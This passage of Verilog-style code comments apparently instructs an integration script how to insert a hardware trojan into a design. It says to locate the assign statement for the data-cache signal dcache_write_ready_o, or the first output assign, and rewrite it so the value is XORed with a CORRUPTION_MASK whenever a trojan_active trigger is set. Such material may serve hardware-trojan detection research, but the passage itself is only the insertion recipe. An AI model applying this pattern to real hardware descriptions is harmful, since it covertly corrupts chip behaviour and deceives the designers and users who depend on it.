...
//
// IMPORTANT: dcache_write_ready_o may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If dcache_write_ready_o is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for dcache_write_ready_o (or first output assign):
//     assign dcache_write_ready_o = <expr>;
//   Replace with:
//     assign dcache_write_ready_o = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
